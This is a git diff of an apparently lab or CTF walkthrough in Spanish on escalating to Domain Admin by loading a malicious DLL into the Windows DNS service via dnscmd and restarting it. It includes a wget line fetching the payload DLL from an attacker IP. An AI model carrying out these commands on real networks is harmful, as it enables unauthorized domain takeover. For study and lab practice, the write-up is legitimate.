@@ -443,10 +443,10 @@ wget "http://10.10.14.29:7777/adduser.dll" -outfile "adduser.dll"
 Cargamos la dll con el siguiente comando:
 
 ```powershell
-dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll
 ```
 
-<img width="845" height="156" alt="image" src="https://github.com/user-attachments/assets/6006cc50-c984-4934-985d-05c34aecaf11" />
+<img width="846" height="142" alt="image" src="https://github.com/user-attachments/assets/69e13cc1-36f5-4389-aa67-34d67146b311" />
 
 
 Para que estos cambios tengan efecto, el servicio DNS debe reiniciarse. Procedemos a verificar si tenemos los permisos para reiniciar el servicio.
@@ -486,10 +486,25 @@ Iniciamos el servicio nuevamente:
 sc start dns
 ```
 
+Vemos que los comandos no arrojan una salida, por lo que es posible que no estén funcionando. Utilizamos el comando completo:
+
+```cmd
+sc.exe stop dns
+```
+```cmd
+sc.exe start dns
+```
+
+<img width="735" height="384" alt="image" src="https://github.com/user-attachments/assets/6a9727a5-3417-4b6f-902d-b28088ec440d" />
+
+
 Tras reinicio exitoso, si la DLL ejecutaba `net group "Domain Admins" ...` deberíamos ver al usuario añadido al grupo `Domain Admins`.
 
 Listamos miembros del grupo `Domain Admins` en el dominio:
 ```powershell
 net group "Domain Admins" /domain
 ```
+
+<img width="611" height="178" alt="image" src="https://github.com/user-attachments/assets/2ff34ef8-b0b6-434a-9c30-0bc641ecd685" />
+
 
